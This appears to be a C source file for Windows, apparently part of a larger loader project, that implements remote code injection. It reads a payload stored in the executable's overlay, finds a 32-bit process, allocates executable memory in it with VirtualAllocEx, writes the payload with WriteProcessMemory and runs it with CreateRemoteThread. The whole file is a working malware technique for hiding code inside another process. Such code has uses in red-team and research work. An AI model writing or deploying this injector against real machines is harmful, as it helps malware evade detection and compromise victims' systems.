#include <windows.h>
#include <TlHelp32.h> 
#include <string.h>
#include <stdio.h>
#include "..\..\Shared\overlay.c"
#include "..\..\Shared\findProcess.c"


typedef void* HANDLE;


void remoteExeInjection(){
    struct Overlay overlay;
    getOverlay(&overlay);

    int pid = findPidOf32BitProcess(0);
    if (pid == 0){
        perror("Injection failed. Suitable process could not be found.\n");
        exit(EXIT_FAILURE);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == INVALID_HANDLE_VALUE){
        perror("Injection failed. Process could not be opened.\n");
        exit(EXIT_FAILURE);
    }

    LPVOID remoteProcessAddress = VirtualAllocEx(hProcess, NULL, overlay.overlaySize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteProcessAddress == NULL){
        perror("Injection failed. Could not allocate memory in remote process.\n");
        exit(EXIT_FAILURE);
    }

    if (WriteProcessMemory(hProcess, remoteProcessAddress, overlay.overlayData, overlay.overlaySize, NULL) == 0){
        perror("Injection failed. Could not write to remote process.\n");
        exit(EXIT_FAILURE);
    }

    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteProcessAddress, NULL, 0, NULL);
    if(hNewThread == NULL){
        perror("Injection failed. Could not create remote thread.\n");
        exit(EXIT_FAILURE);
    }

}

